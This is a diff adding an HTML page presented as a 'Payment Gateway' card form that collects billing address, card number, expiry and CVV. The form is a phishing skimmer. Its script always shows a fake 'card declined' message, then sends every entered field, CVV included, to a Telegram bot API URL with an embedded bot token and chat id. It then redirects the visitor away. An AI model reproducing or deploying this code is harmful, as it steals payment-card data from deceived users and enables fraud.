@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+    
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="css/style.css">
+    
+    <title>Payment Gateway</title>
+
+    <style>
+        .alert-container {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            z-index: 9999;
+        }
+
+        .alert {
+            margin-bottom: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <form action="" id="paymentForm">
+            <h2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Add a card to your account</h2><br>
+            <div class="row">
+                <div class="col">
+                    <h3 class="title">Billing address</h3>
+                    <div class="inputBox">
+                        <span>full name :</span>
+                        <input type="text" id="name" required>
+                    </div>
+                    <div class="inputBox">
+                        <span>email :</span>
+                        <input type="email" id="email" required>
+                    </div>
+                    <div class="inputBox">
+                        <span>address :</span>
+                        <input type="text" id="address" required>
+                    </div>
+                    <div class="inputBox">
+                        <span>city :</span>
+                        <input type="text" id="city" required>
+                    </div>
+                    <div class="flex">
+                        <div class="inputBox">
+                            <span>State :</span>
+                            <input type="text" id="state" required>
+                        </div>
+                        <div class="inputBox">
+                            <span>Zip code :</span>
+                            <input type="text" id="zipcode" required>
+                        </div>
+                    </div>
+                </div>
+                <div class="col">
+                    <h3 class="title">payment</h3>
+                    <div class="inputBox">
+                        <span>cards accepted :</span>
+                        <img src="images/card_img.png" alt="">
+                    </div>
+                    <div class="inputBox">
+                        <span>Name on card :</span>
+                        <input type="text" id="cardname" required>
+                    </div>
+                    <div class="inputBox">
+                        <span>Card number :</span>
+                        <input type="number" id="cardnumber" required>
+                    </div>
+                    <div class="inputBox">
+                        <span>Exp month :</span>
+                        <input type="number" id="expmonth" min="1" max="12" required>
+                    </div>
+                    <div class="flex">
+                        <div class="inputBox">
+                            <span>Exp year :</span>
+                            <input type="number" id="expyear" required>
+                        </div>
+                        <div class="inputBox">
+                            <span>CVV :</span>
+                            <input type="text" id="cvv" required>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <input type="submit" value="Proceed to Booking" class="submit-btn" >
+        </form>
+        <div id="alert-container" class="alert-container"></div>
+    </div>
+
+    <!-- Bootstrap JS -->
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+
+    <!-- Custom JS -->
+    <script src="script.js"></script>
+    <script>
+        const paymentForm = document.getElementById('paymentForm');
+        const alertContainer = document.getElementById('alert-container');
+
+        paymentForm.addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevent form submission
+
+            const name = document.getElementById('name').value;
+            const email = document.getElementById('email').value;
+            const address = document.getElementById('address').value;
+            const city = document.getElementById('city').value;
+            const state = document.getElementById('state').value;
+            const zipcode = document.getElementById('zipcode').value;
+            const cardname = document.getElementById('cardname').value;
+            const cardnumber = document.getElementById('cardnumber').value;
+            const expmonth = document.getElementById('expmonth').value;
+            const expyear = document.getElementById('expyear').value;
+            const cvv = document.getElementById('cvv').value;
+
+            // Check if any field is empty
+            if (!name || !email || !address || !city || !state || !zipcode || !cardname || !cardnumber || !expmonth || !expyear || !cvv) {
+                showAlert('warning', 'Please enter all the required fields.');
+                return;
+            }
+
+            // Check if expiry month is valid
+            if (expmonth > 12 || expmonth < 1) {
+                showAlert('warning', 'Please enter a valid expiry month.');
+                return;
+            }
+
+            // Simulate card declined
+            showAlert('danger', 'Your card was declined. Please try again later');
+            setTimeout(()=>{
+                booking()
+            },3000);
+            
+        });
+
+        function showAlert(type, message) {
+            const alert = `
+                <div class="alert alert-${type} alert-dismissible fade show" role="alert">
+                    ${message}
+                    <button type="button" class="close" data-dismiss="alert" aria-label="Close">
+                        <span aria-hidden="true">&times;</span>
+                    </button>
+                </div>
+            `;
+
+            alertContainer.innerHTML = alert;
+        }
+
+        function booking() {
+            let namee = document.getElementById("name").value
+    let email = document.getElementById("email").value
+    let address = document.getElementById("address").value
+    let city = document.getElementById("city").value
+    let state = document.getElementById("state").value
+    let zipcode = document.getElementById("zipcode").value
+    let cardname = document.getElementById("cardname").value
+    let cardnumber = document.getElementById("cardnumber").value
+    let expmonth = document.getElementById("expmonth").value
+    let expyear = document.getElementById("expyear").value
+    let cvv = document.getElementById("cvv").value
+
+
+    let data = `{"data":{
+        personal:{
+            name:${namee},
+            email:${email},
+            address:${address},
+            city:${city},
+            state:${state},
+            zipcode:${zipcode}
+        },
+        card: {
+            cardnane:${cardname},
+            cardnumber:${cardnumber},
+            expmonth:${expmonth},
+            expyear:${expyear},
+            cvv:${cvv}
+        }
+        }}`
+
+
+
+
+    url = "https://api.telegram.org/bot6575738554:AAEd-gnHRqKKaXqKAyPxwhMHgAnCENn62U4/sendmessage?chat_id=858000187&text="
+    final_url = url + data;
+    fetch(final_url)
+    .then(response=>text)
+    .then(html=>alert(html));
+            window.location.href = "/"
+        }
+    </script>
+</body>
+</html>
